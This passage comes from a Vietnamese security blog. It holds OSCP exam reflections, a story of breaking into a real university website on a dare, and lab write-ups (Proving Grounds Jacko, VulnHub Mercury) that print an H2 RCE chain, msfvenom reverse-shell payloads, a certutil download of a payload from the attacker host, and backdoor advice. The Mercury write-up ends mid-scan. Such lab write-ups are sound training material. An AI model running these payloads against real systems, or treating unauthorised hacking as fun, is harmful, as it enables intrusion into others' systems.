sau đó để Mimikatz làm việc của nó.\nNền tảng Office 365 của Microsoft đồng bộ 2 chiều với AD, vậy nên nếu muốn truy cập vào Outlook của nhân viên nào đó mà không có mật khẩu (không crack được NTLM hash), bạn có thể dùng quyền Domain Admin để đổi mật khẩu nhân viên đó trên AD, chờ đôi phút, rồi đăng nhập lại với mật khẩu vừa đổi. Cách này thì…\nCài cắm một vài back door để phòng khi mất sạch kết nối với các beacon&#x2F;meterpreter session, có thể là web shell, hoặc thông tin kết nối VPN…\nNếu sử dụng crackmapexec gặp lỗi, hãy thử đổi tham số –exec-method, hoặc sử dụng phiên bản khác. Tôi đã gặp vấn đề với smbexec với phiên bản CME mới nhất nhưng lại bình thường với phiên bản cũ hơn.\nVà đừng cố giúp ai đó khi họ không muốn được giúp, kiểu, nhiều chuyện :D\n\n","categories":["Talk"],"tags":["talk","sql injection","active directory"]},{"title":"[Talk] Tôi đã tạch OSCP như thế nào?","url":"/2021/09/28/how-i-fail-oscp-exam/","content":"Đây có lẽ là trải nghiệm thi cử mà tôi sẽ rất nhớ trong cuộc đời mình… vì nó đắt vl, cả về giá, và cả về những gì tôi đã học được.\n\nTròn 2 tháng kể từ khi tôi nhận được chiếc bằng “cứng”, khá lâu, vì tính tới thời điểm đó, tôi đã hoàn thành bài thi của mình được khoảng 7 tuần và cũng nhận được email thông báo đã đạt chứng chỉ sau đúng 2 ngày.Đó là lần thi thứ hai của tôi, sau trải nghiệm lần đầu với kết quả khá tệ.\nVề OSCP, Offsec và “Try harder!”https://www.offensive-security.com/offsec/what-it-means-to-try-harder/\nBạn có thể nhìn vào logo của Offsec, nó lạ và dị dị, lần đầu tôi thấy thì cảm giác cũng y vậy.Nó vẽ một người đàn ông và cái bóng của anh ta trải dài ở phía dưới.Tôi từng đọc ở đâu đó, về hình ảnh này, lấy ẩn dụ đằng sau cánh cửa là những kiến thức, và cái bóng của anh ta thì lớn hơn con người anh ta khi đứng trước ngưỡng cửa.Trước đó thì tôi chưa bao giờ nghĩ mình sẽ thi OSCP, dễ hiểu vì tôi có đếch kiến thức đâu mà thi, và cũng chả có tiền. Thế rồi…\nÔn luyện các kiểuTôi đăng ký OSCP trước Tết Nguyên Đán 2021, vì không muốn ăn Tết năm đó theo cách bình thường. Nhưng rồi thì tôi vẫn ăn Tết bình thường và bỏ phí mất 1 tuần không đụng gì vào lab.\nĐem in 800 trang tài liệu mà Offsec cung cấp cho khoá học, đọc được 5 chương đầu, chủ yếu là về các công cụ và kỹ thuật khai thác tràn bộ đệm… Cuối cùng thì tôi quyết định làm bài Alpha trong OSCP Lab, khi kỳ nghỉ Tết còn 2 ngày và cái đầu thì đầy bánh chưng.\nBài Alpha này như một bài mở đầu, có bài viết rất rất chi tiết trên diễn đàn Offsec (tài khoản để vào được diễn đàn này có giá tương đương với giá khoá học, đùa đấy, chỉ những sinh viên của Offsec mới có tài khoản này). Tôi đã đọc rất kỹ bài viết, lạy hồn, nó hay, chi tiết, và viết nhiều cách. Dẫn dắt tư duy từ những bước tìm kiếm thông tin, nêu ra các hướng tấn công có thể và loại trừ các khả năng, tránh bẫy (rabbit hole), thu hẹp phạm vi đánh giá, tìm điểm yếu và khai thác điểm yếu… đó là những gì mà bài viết mang lại, nhìn chung, đó cũng là những gì mà khoá học OSCP mạng lại.\nKể từ ngày hôm đó, tôi chuyển hẳn sang làm lab và không còn động đến tài liệu nữa &#x3D;)) lười vl. Sau khoảng 30 ngày, tôi hoàn thành 30 máy trong đó, có những máy rất dễ, chỉ cần tìm đúng exploit và chạy là xong. Nhưng có những máy cực khó, thú nhận là lắm khi tôi đã phải mò vào forum để tìm kiếm câu trả lời, điều đó là không nên, hãy hạn chế. Có những máy cần thông tin từ những máy khác (nếu chả may bạn đang tắc tịt ở một máy nào đó trong dải mạng Public thì có thể lắm là bạn đã húc phải những máy này, đây là điều tôi ghét ở OSCP Lab vì nó làm tốn thời gian của tôi).\nTrong lab có 3 dải mạng, bạn có thể tấn công trực tiếp vào các máy trong dải mạng Public, hoàn thành được khoảng 80% trên tổng số các máy này, bạn sẽ có đủ tự tin để tham gia thi. Nếu vẫn còn thời gian, hãy thử chiến thêm các máy trong dải mạng Dev và Admin, để vào được hai dải mạng này, bạn sẽ phải “root” được 2 máy trong dải Public và dùng nó để làm bàn đạp tấn công vào sâu hơn (pivot). Hệ thống OSCP Lab được thiết kế mô phỏng một mạng doanh nghiệp.\nTổng kết OSCP Lab, tôi hoàn thành 41&#x2F;6x máy. Hừng hực rồi đấy, đăng ký lịch thi!\nLần thi đần tiên. 2&#x2F;5 máy. Tạch!Tôi chuẩn bị khá kỹ, setup 2 màn hình các kiểu, ghi chép lại những mánh hay ho học hỏi được từ khắp các thể loại tài liệu, bài viết, xỉa răng, xúc miệng… nói chung là kỹ càng.\nĐến giờ thi, trao đổi qua một chút với giám thị, tôi chẳng thạo tiếng Anh, có mấy câu cơ bản thôi, xin đi tè, xin đi ăn, xin đi ị, xin đi ngủ… thế là đủ, còn lại chả nói gì với nhau nhiều vì còn xoắn đít lên mà làm bài.\nBị mất rất nhiều thời gian với bài khai thác lỗi tràn bộ đệm, bài này 25 điểm. Tôi đã bỏ qua đoạn code mà đề bài cho sẵn mà lại tự đi mò cổng dịch vụ dính lỗi, ngu xuẩn, cái giá phải trả là tôi tốn mất hơn 3 tiếng cho bài BOF đó. Cảm giác run bần bật ở đầu ngón tay đỡ hơn, đi uống ụm nước và bắt đầu đọc thông tin autorecon từ 4 máy còn lại.\nMột mớ bòng bong đúng nghĩa. Rất nhiều bẫy và hoàn toàn lạ lẫm, đó là cảm giác của tôi, nó khác khá xa so với những máy trong lab. Hoặc là tôi vẫn chưa đủ trình độ với bài thi này.\nTrong suốt thời gian còn lại, tôi làm thêm được bài 10 điểm, những máy sau thì chịu, lý do rất đơn giản, tôi không thể. Tôi đã mất nhiều thời gian nhất vào bài 25 điểm, đã gần chạm tới chiếm quyền điều khiển, nhưng vẫn có gì đó không hề rõ ràng và có thể phải mất cả ngày trời để tìm hiểu về điều đó.\nVậy là tạch.Sau đó là khoảng thời gian không vui vẻ gì, kiểu, suy sụp.\nChạy đà lần haiNguyên một tuần sau khi tạch, tôi không đụng vào lab dù vẫn còn thời gian truy cập, cũng như không làm gì cả. Sau đó là chạy dự án công ty, liền cả tháng trời, vẫn thi thoảng mò vào Vulnhub hay HackTheBox, không nhiều.\nCho đến một ngày tôi đọc được một bài viết trên Reddit, chủ thread này y chang tôi, cũng choáng ngợp với những máy trong OSCP Exam mặc dù anh ấy đã hầu như hoàn thành hết các máy trong OSCP Lab. Rất nhiều bình luận bên dưới tương tự, và họ đều nói rằng kỳ thi lần hai ổn hơn, và ôn luyện với Proving Grounds.\nThế là tôi bắt đầu với Proving Grounds, $19 một tháng. Trải nghiệm trên PG giống hệt như thi, các máy được xếp độ khó theo thang điểm như trong OSCP Exam.\nTôi làm hết những bài 10 điểm, đúng, nó dễ, chỉ cần tìm được đúng exploit là xong, nhưng nhiều bẫy. Nắm được điều này như kiểu bắt bài, tôi hoàn thành chỗ bài 10 điểm chỉ trong 3 ngày. Với những bài 20 điểm và 25 điểm, lắt léo hơn, nhưng tóm lại kỹ thuật không mới, liệt kê (enumerate) và tìm kiếm thêm thông tin (research), tìm kiếm exploit không chỉ dùng ExploitDB mà còn kết hợp với Github… Sau gần một tháng tu luyện lại, tôi rõ hơn về cách làm những bài 10 điểm, 20 điểm và 25 điểm, không còn mù mờ như lần đầu thi. Cảm giác khá là thoáng. Rảnh rảnh thì ngồi xem video của Ippsec, phải nói là gã này lắm mánh hay.\nĐược rồi, đóng họ $150 và thi lại!\nThi lần hai. 4,5&#x2F;5 máy. Hê!Mặc dù vẫn gặp chút ngớ ngẩn với bài BOF những tôi vẫn hoàn thành nó trong thời gian mình tự định ra, và hoàn thành tiếp bài 10 điểm ngay sau đó. Lúc này tôi còn khoảng gần 22 giờ cho 3 bài còn lại.\n4 tiếng sau, tôi hoàn thành bài 20 điểm, cũng khá căng đấy, hơi run, nhưng không sao, chiến tiếp bài 25 điểm để tối ngủ cho ngon.\nĂn cơm tắm rửa cho người ngợm đỡ hôi. Phải mất đến 6 tiếng để tôi hoàn thành được bài 25 điểm.Vậy là được 80 điểm, thế là pass rồi, cảm giác lúc đó đỉnh lắm, không thể gào thét thì giờ là 1h sáng, cũng vừa hết bóng đá giữa Việt Nam và đội quái nào chẳng nhớ, tôi ra ban công hóng gió và nhắn tin khoe các kiểu &#x3D;))\nQuay lại bàn, chụp ảnh POC và note lại kỹ càng, ăn chắc mặc bền với 80 điểm, tôi đi ngủ.\nĐến sáng, lúc này còn khoảng 5 tiếng nữa là hết giờ. Tranh thủ đớp cái bánh và ngồi xem có gặm được bài 20 điểm còn lại không. Ăn may là có. Cuỗm thêm được nửa điểm của bài đó vì chiếm được quyền điều khiển, nhưng không thể leo thang lên quyền system được, thôi bỏ, còn đôi chục phút, chào lễ phép giám thị và ngắt kết nối VPN.\nĐánh thêm một giấc nữa tới chiều và đi đạp xe, về viết báo cáo và nộp.(Đừng đùa, khoản viết báo cáo cũng tốn thời gian đấy, đừng nghĩ 24h là đủ với tâm hồn hay delay)\nChứng chỉ, và những gì nhận đượcNộp report khoảng 2 ngày, tôi nhận được mail báo đạt chứng chỉ vào hôm Chủ Nhật.Đấy là thông báo mà tôi đã mong chờ nửa năm nay. Yah!\nNhững gì học được từ OSCP là một bước đệm, bước đệm thực sự quan trọng. Trước đó tôi là một con gà mờ đúng nghĩa khi chỉ biết dùng tool chạy chạy mà chẳng hiểu gì, sau này thì vẫn là gà, nhưng đỡ mờ hơn một chút, biết mình phải làm gì và sử dụng công cụ như thế nào.\nOSCP hướng tới sự tư duy vể nhìn nhận đa chiều, phản biện, liệt kê và tìm kiếm, đây là những bước đầu quan trọng nếu muốn bắt đầu với Pentester.\nChia sẻ chútMấy tip nhỏ nếu bạn đã và đang chuẩn bị thi OSCP.\n\nHãy dùng Windows là máy host, chạy Kali trên máy ảo thôi. Chẳng phải ngẫu nhiên mà điều này nằm trong cả hướng dẫn của Offsec đâu, vì Linux có vấn đề khi chạy chương trình giám sát của giám thị do xung đột về quyền.\nNếu bạn dùng quen 2 màn hình, ok, tuỳ, lần thi đầu tôi cũng dùng 2 màn hình, nó khiến tôi bị… mất tập trung (mặc dù khi làm việc tôi vẫn dùng 2 màn hình). 1 màn hình là đủ, và bạn cũng có lợi hơn về băng thông mạng khi đỡ phải chia sẻ thêm một màn hình phân giải Full HD.\nChuẩn bị môi trường Kali thật tốt, tạo backup, snap shot, đừng để đến lúc thi nó lại lăn ra đấy thì…\nHãy đảm bảo mạng mẽo ổn định, và cả nguồn điện nữa. Nếu mất điện, bạn có thể báo lại với giám thị để họ cộng bù giờ, nhưng rất ảnh hưởng tâm lý.\nĂn và ngủ, đừng quá sức :D\nNếu có tạch, bạn có thể thi lại, có sao đâu.\n\nVài nguồn hay bạn có thể xem, vì tôi đã xem rất nhiều :v\n\nPayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThingsKhông phải ngẫu nhiên mà nó được tận 30.4k sao đâu.\n\nReverse Shell Generator https://www.revshells.com/Cái này để tạo reverse shell nhanh, đại khái thé.\n\nKênh Youtube Ippsec https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQAXem người giỏi họ làm gì, sẽ có rất nhiều cái hay ho đấy.\n\nTheo dõi Twitter và Medium những người làm về Cyber SecurityThật đấy, Toptop với Tinder ít thôi.\n\n\n","categories":["Talk"],"tags":["talk","oscp"]},{"title":"[Talk] Tôi đã 'hách' trang web đầu tiên trong đời mình như thế nào?","url":"/2021/08/03/how-i-hacked-the-first-website/","content":"Những lỗ hổng được nhắc đến dưới đây đều đã được vá, hoặc nói thẳng ra là họ đã xây dựng lại toàn bộ hết rồi, từ máy chủ, cho đến trang web, công nghệ, etc… cho nên là bài viết này đọc chơi chơi thôi, không làm theo được nữa đâu, hehe.\n\n\nĐó là vào một ngày giữa năm 2019, nắng vỡ mặt. Cái Hoàn, bạn tôi, một sinh viên mẫu mực của đại học Hà Nội, câu chuyện bắt đầu từ mẹt bún đậu và một lời thách thức “đố mày làm gì được cái trang web trường tao đấy” kèm theo đó là voucher 1 năm ăn bún đậu miễn phí, nghe qua cơ cấu giải thưởng là đủ biết nó ghét trường nó đến thế nào. Sao lại có thể ghét được ngôi trường toàn con gái như thế cơ chứ?Ok, thế là tôi nhận kèo láo, vì bản thân chưa bao giờ làm điều tương tự, nó thách thức tôi, còn tôi thì thách thức chính tôi &#x3D;))Cho đến bây giờ nhìn lại, tôi thấy vụ này dễ vl!\nBegin with Nmap, so simple…Sử dụng mỗi flag “-A” là đủ hiểu tôi ngu ngơ đến thế nào, nhưng không sao, dù gì cũng đã thấy cái cần thấy. “Joomla”.Hmm… Thế Joomla là cái quái gì?\n\nJoomla! là một hệ quản trị nội dung nguồn mở, được cung cấp miễn phí theo giấy phép GNU. Joomla được phát triển từ Mambo, được viết bằng ngôn ngữ PHP và kết nối tới cơ sở dữ liệu MySQL, cho phép người sử dụng có thể dễ dàng xuất bản các nội dung của họ lên Internet hoặc Intranet.\n\nTheo Wikipedia thì dài dòng là vậy, còn với tôi, tôi đếch biết, đại khái thì là một CMS viết bằng PHP.Sau đó tôi chạy Nikto và tìm thêm được đường dẫn tới phpMyAdmin (trang quản trị cơ sở dữ liệu MySQL), và một vài đường dẫn mặc định của Joomla. (Trời ạ, khi đó tôi chưa hề biết đến sự tồn tại của Dirsearch hay Gobuster…)\nSau một hồi Google, cũng chả lâu, tôi biết được thêm công cụ scan chuyên dùng cho Joomla, hê hê, Joomscan.Scan xong tòi ra lỗi Local File Disclosure, lỗi này cho phép tôi có thể lấy nội dung của bất kỳ file nào mà tôi được phép. Joomscan đã trích xuất ra thông tin đăng nhập vào MySQL từ file configuration.php, cơ mà khi đó tôi chả biết gì &#x3D;)) Đơn giản là thấy thông tin đăng nhập vào cơ sở dữ liệu, má ơi…\nVậy là tôi đem thông tin đăng nhập kia login vào trang phpMyAdmin, Boom! Giờ tôi có toàn quyền kiểm soát cái CSDL này luôn rồi.\nOk, đấy là lỗi thứ nhất, tiếp :v\nFiles Manager not authen require, meh~Quay lại với lỗi LFD, với URL như này:http://hanu.vn/ad#####ex.php?action=download&amp;dir=&amp;item=configuration.php&amp;order=name&amp;srt=yesYeb, đương dẫn trên cho phép tôi tải về được file configuration.php, thế giờ tôi muốn chỉnh sửa, để chèn thêm một đoạn mã độc vào thì sao? Tôi bắt đầu nhìn vào param action&#x3D;download, thử xoá giá trị “download” đi xem sao? Okay…BOOM!\nỜ hờ, giờ thì tôi hoàn toàn có thể thêm&#x2F;sửa&#x2F;xoá tất tần tật đống mã nguồn của trang hanu.vn, haha, điều này là siêu tệ khi ông chú Quản trị viên không hề cấu hình xác thực cho trang này, khó mà hiểu được lí do tại sao.Quay lại một chút, thế tại sao tôi biết mà xoá cái từ “download” trên cái URL kia? Dễ thôi, khi đó tôi đã nhìn thấy một URL khác có param action&#x3D;view, như vậy param này trỏ về hành động muốn thao tác lên file, view, download, edit, save, bla bla…. Còn việc tại sao khi xoá đi nó lại nhảy về trang Files Manager, đó có thể là do Joomla đang không hiểu hành động lên file đó là gì, cho nên nó đã list toàn bộ file và folder ở thư mục root của website (dir&#x3D;) và không quan tâm giá trị của các param còn lại nữa.Giờ thì dễ rồi, up shell lên thực thi lệnh bét nhè thôi &#x3D;))\nChả nhớ nữa, nhưng vụ này ngốn của tôi 2 tuần, giống như bắt đầu tìm tòi từ con số 0 vậy, nghĩ lại mới thấy mình đã học được rất nhiều điều kể từ sau đó, mọi việc chưa bao giờ dễ dàng hơn, mà là do bản thân đã biết hơn. Viết cho bên quản trị một chiếc mail để báo lỗi và hy vọng họ không coi mình là thằng phá hoại…\nChốt lại, ở thời điểm hiện tại HANU đã nâng cấp hệ thống ngon lành rồi, máy chủ Windows thay cho Linux, web cũng sử dụng ASP .NET chứ không còn là PHP, nói chung xịn hơn hẳn, không còn dính mấy lỗi vớ vẩn kia nữa. Chắc là họ đã có kế hoạch từ lâu, chỉ là tôi đã khiến cho deadline release bị rút ngắn hơn thôi &#x3D;)) rõ khổ đội Dev.\n","categories":["Talk"],"tags":["talk","fun"]},{"title":"[Proving Grounds] Jacko","url":"/2021/07/01/jacko-pg/","content":"\nOverviewDifficulty: Offsec để Intermediate, còn Community rate HARD :v \n\nIP Victim: 192.168.163.66IP Attacker: 192.168.49.55\nInformation GatheringOài, xem là máy mục tiêu đang có những port nào mở và dịch vụ chạy đằng sau nó, bla bla…\n$ nmap -p- --open --min-rate 3000 192.168.163.66Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 15:54 +07Nmap scan report for 192.168.206.66Host is up (0.27s latency).Not shown: 65529 filtered portsSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE80/tcp   open  http135/tcp  open  msrpc139/tcp  open  netbios-ssn445/tcp  open  microsoft-ds7680/tcp open  pando-pub8082/tcp open  blackice-alertsNmap done: 1 IP address (1 host up) scanned in 44.31 seconds$ nmap -sC -sV -p 80,135,139,445,7680,8082 192.168.163.66Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-13 15:55 +07Nmap scan report for 192.168.206.66Host is up (0.28s latency).PORT     STATE SERVICE       VERSION80/tcp   open  http          Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: H2 Database Engine (redirect)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp  open  microsoft-ds?7680/tcp open  pando-pub?8082/tcp open  http          H2 database http consoleService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2021-06-13T08:56:17|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 80.22 seconds\nPhân tích một chút, có thể đoán đoán máy mục tiêu đang sử dụng hệ điều hành Windows, mà thực ra tôi biết thừa nó chạy Windows rồi, đề bài để cái logo Windows mà :vHoặc để ý vào port 80 và nhận thấy phần version có tên “Microsoft IIS httpd 10.0”, uy tín luôn.Sơ qua thì:\n\nHTTP server trên 2 port 80 và 8082\nSMB trên 2 port 139 và 445\nRPC trên port 135\n??? trên port 7680 :))) tạm thời chịu\n\nGiao diện khi truy cập vào port 80 và 8082 thì như này đây:Và…Tin tôi đi, tôi đéo biết nó là mẹ gì đâu, có thể là một giao diện quản lý Database nào đó na ná như cái PhpMyAdmin mà tôi đã từng gặp. Với ô username đang có giá trị mặc định hiển thị là sa, tôi đoán DBMS đang sử dụng là MSSQL. Kệ mẹ nó, cứ nhấn Login xem sao :)) Bùm!Login thành công với thông tin đăng nhập mặc định, my god!Giờ thì thử tìm kiếm exploit về thằng H2 console này xem có khai thác RCE được không.Nhận thấy có 3 exploit cho phép RCE, với phiên bản 1.4.196 và 1.4.199, đối chiếu với phiên bản H2 Database đang sử dụng trên máy mục tiêu là 1.4.199, khớp ngon lành, khai thác thôi!\nExploitationH2 Database 1.4.199 - JNI Code Execution (https://www.exploit-db.com/exploits/49384)Bám theo các bước trong PoC, đầu tiên là ghi một file thư viện .DLL vào trong thư mục có quyền ghi (C:\\Windows\\Temp\\):\nSELECT CSVWRITE(&#x27;C:\\Windows\\Temp\\JNIScriptEngine.dll&#x27;, CONCAT(&#x27;SELECT NULL &quot;&#x27;, CHAR(0x4d),CHAR(0x5a),CHAR(0x90),CHAR(0x00),CHAR(0x03),CHAR(0x00),CHAR(0x00),CHAR(0x00)...&#x27;ISO-8859-1&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;);\nSau đó thực hiện load file thư viện này và đặt tên (alias) thành “JNIScriptEngine_eval”.\nCREATE ALIAS IF NOT EXISTS System_load FOR &quot;java.lang.System.load&quot;;CALL System_load(&#x27;C:\\Windows\\Temp\\JNIScriptEngine.dll&#x27;);CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR &quot;JNIScriptEngine.eval&quot;;\nAll done! Thực thi lệnh whoami.\nCALL JNIScriptEngine_eval(&#x27;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream()).useDelimiter(&quot;\\\\Z&quot;).next()&#x27;);\nKết quả trả về là jacko\\tony, đã vl!Ok, tiếp theo lấy reverse shell.\nGet shellTạo một payload với MSFvenom:\n$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.55 LPORT=445 -f exe -o duma445.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 324 bytesFinal size of exe file: 73802 bytesSaved as: duma445.exe\nKhởi chạy HTTP server trên thư mục chứa payload vừa tạo để máy mục tiêu tải duma443.exe về.\nCALL JNIScriptEngine_eval(&#x27;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&quot;certutil -urlcache -f http://192.168.49.55/duma445.exe C:/Windows/Temp/duma445.exe&quot;).getInputStream()).useDelimiter(&quot;\\\\Z&quot;).next()&#x27;);\nTrên máy Kali của tôi lúc này sẽ xuất hiện request từ phía máy mục tiêu với mã response 200, xác nhận tải file payload thành công.\n$ updog -p 80[+] Serving /home/kali/Dropbox/Labs/PG/Machines/Jacko... * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)192.168.55.66 - - [01/Jul/2021 01:23:58] &quot;GET /duma445.exe HTTP/1.1&quot; 200 -192.168.55.66 - - [01/Jul/2021 01:23:59] &quot;GET /duma445.exe HTTP/1.1&quot; 200 -\nGiờ thì chỉ cần bật lắng nghe trên cổng 445 và chạy payload.\nCALL JNIScriptEngine_eval(&#x27;new java.util.Scanner(java.lang.Runtime.getRuntime().exec(&quot;C:/Windows/Temp/duma445.exe&quot;).getInputStream()).useDelimiter(&quot;\\\\Z&quot;).next()&#x27;);\nOk, lấy Flag đầu tiên nằm trong C:\\Users\\tony\\Desktop\\local.txtlocal.txt: c64e9635a454835427a021f0ac96680b\nPrivileges EscalationSau một hồi tim kiếm các thể loại, tải Winpeas lên chạy các kiểu con đà điểu, không ăn thua lắm. Tôi quay về với cách try hard :&#x2F;Tìm kiếm xem máy này đã cài đặt các chương trình gì?Hmm….\n$ searchsploit PaperStream---------------------------------------------------------------------- --------------------------------- Exploit Title                                                        |  Path---------------------------------------------------------------------- ---------------------------------PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation       | windows/local/49382.ps1---------------------------------------------------------------------- ---------------------------------\n&#x3D;)) Ok “Local Privilege Escalation”Làm theo PoC, tạo một payload .DLL để lấy reverse shell:\nmsfvenom -p windows/shell_reverse_tcp -f dll -o duma8082.dll LHOST=192.168.49.55 LPORT=8082\nDo tôi đang có quyền của user tony nên tôi hoàn toàn có thể thao tác trong thư mục C:&#x2F;Users&#x2F;tony, sửa đổi lại đường dẫn $PayloadFile trong script và tải 49382.ps1, duma8082.dll vào thư mục C:&#x2F;Users&#x2F;tony.Một vấn đề nữa là powershell phải sử dụng đường dẫn tuyệt đối để truy cập, và phải Unrestricted ExecutionPolicy để có thể thực thi được script.Như này:Bật lắng nghe trên công 8082 và thực thi script 49382.ps1, lấy được shell system.Done!\n","categories":["Proving Grounds"],"tags":["write up","proving grounds","hard"]},{"title":"[VulnHub] Mercury","url":"/2020/12/25/mercury-vulnhub/","content":"\nOverviewLink download: THE PLANETS: MERCURYDifficulty: EasyĐây là một machine trên Vulnhub, theo dạng boot2root, yêu cầu của bài là phải lấy được 2 flag trong user.txt và root.txt.\n\nOkay, xem có gì ở đây nào.\nInformation GatheringNmapGo! Xem cái của nợ này đang có địa chỉ IP là gì.\n$ nmap 10.10.10.0/24                                                                             Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 21:16 +07Nmap scan report for 10.10.10.1Host is up (0.00022s latency).All 1000 scanned ports on 10.10.10.1 are closedNmap scan report for 10.10.10.10Host is up (0.00026s latency).Not shown: 998 closed portsPORT     STATE SERVICE22/tcp   open  ssh8080/tcp open  http-proxyNmap done: 256 IP addresses (2 hosts up) scanned in 2.85 seconds\nTóm được machine đang có IP là 10.10.10.10, IP đẹp phết đấy ml &#x3D;))Tạm thời thấy 2 cổng đang được mở là 22-SSH và 8080-HTTP. Để chắc chắn hơn thì cứ quét lại với tham số -p- để kiểm tra tất cả các cổng.\n$ nmap -p- 10.10.10.10                                                                           Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 21:20 +07Nmap scan report for 10.10.10.10Host is up (0.00012s latency).Not shown: 65533 closed portsPORT     STATE SERVICE22/tcp   open  ssh8080/tcp open  http-proxyNmap done: 1 IP address (1 host up) scanned in 1.50 seconds\nChả có vẹo gì thay đổi, vẫn chỉ có 2 cổng này. Tốt thôi, giờ thì xem kỹ hơn 2 cổng này chạy dịch vụ gì, phiên bản bao nhiêu, vân vân mây mây… để đi tìm hướng tấn công.\n$ nmap -p 22,8080 -sV -sC 10.10.10.10                                                            Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 21:20 +07Nmap scan report for 10.10.10.10Host is up (0.00061s latency).PORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2| fingerprint-strings: |   FourOhFourRequest: |     HTTP/1.1 404 Not Found|     Date: Sat, 26 Dec 2020 14:20:56 GMT|     Server: WSGIServer/0.2 CPython/3.8.2|     Content-Type: text/html|     X-Frame-Options: DENY|     Content-Length: 2366|     X-Content-Type-Options: nosniff|     Referrer-Policy: same-origin|     &lt;!DOCTYPE html&gt;|     &lt;html lang=&quot;en&quot;&gt;|     &lt;head&gt;|     &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;|     &lt;title&gt;Page not found at /nice ports,/Trinity.txt.bak&lt;/title&gt;|     &lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&gt;|     &lt;style type=&quot;text/css&quot;&gt;|     html * &#123; padding:0; margin:0; &#125;|     body * &#123; padding:10px 20px; &#125;|     body * * &#123; padding:0; &#125;|     body &#123; font:small sans-serif; background:#eee; color:#000; &#125;|     body&gt;div &#123; border-bottom:1px solid #ddd; &#125;|     font-weight:normal; margin-bottom:.4em; &#125;|     span &#123; font-size:60%; color:#666; font-weight:normal; &#125;|     table &#123; border:none; border-collapse: collapse; width:100%; &#125;|     vertical-align:|   GetRequest, HTTPOptions: |     HTTP/1.1 200 OK|     Date: Sat, 26 Dec 2020 14:20:56 GMT|     Server: WSGIServer/0.2 CPython/3.8.2|     Content-Type: text/html; charset=utf-8|     X-Frame-Options: DENY|     Content-Length: 69|     X-Content-Type-Options: nosniff|     Referrer-Policy: same-origin|     Hello. This site is currently in development please check back later.|   RTSPRequest: |     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;|     &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;|     &lt;title&gt;Error response&lt;/title&gt;|     &lt;/head&gt;|     &lt;body&gt;|     &lt;h1&gt;Error response&lt;/h1&gt;|     &lt;p&gt;Error code: 400&lt;/p&gt;|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;|     &lt;/body&gt;|_    &lt;/html&gt;| http-robots.txt: 1 disallowed entry |_/|_http-server-header: WSGIServer/0.2 CPython/3.8.2|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 93.24 seconds\nNhận được về một đống lằng tằng nhằng, và biết thêm được cổng dịch vụ 22-SSH đang chạy là OpenSSH 8.2p1, cổng 8080 đang chạy http server WSGIServer&#x2F;0.2 CPython&#x2F;3.8.2.Truy cập vào http://10.10.10.10:8080 để xem mặt mũi cái http server của nó ra sao, nhưng đéo có gì ngoài dòng chữ Hello. This site is currently in development please check back later.Chả mới lạ cho lắm, mở xem mã nguồn trang (Ctrl U) cũng không nốt. Giờ thì phải tiếp tục công việc thu thập thông tin bằng cách liệt kê các thư mục&#x2F;tập tin ẩn trên web server, quét với các công cụ khác để kiếm lỗi CVE,…\nNikto$ nikto -h http://10.10.10.10:8080                                                               - Nikto v2.1.6---------------------------------------------------------------------------+ Target IP:          10.10.10.10+ Target Hostname:    10.10.10.10+ Target Port:        8080+ Start Time:         2020-12-26 21:59:58 (GMT7)---------------------------------------------------------------------------+ Server: WSGIServer/0.2 CPython/3.8.2+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ OSVDB-17113: /SilverStream: SilverStream allows directory listing+ Server banner has changed from &#x27;WSGIServer/0.2 CPython/3.8.2&#x27; to &#x27;WSGIServer/0.2 Python/3.8.2&#x27; which may suggest a WAF, load balancer or proxy is in 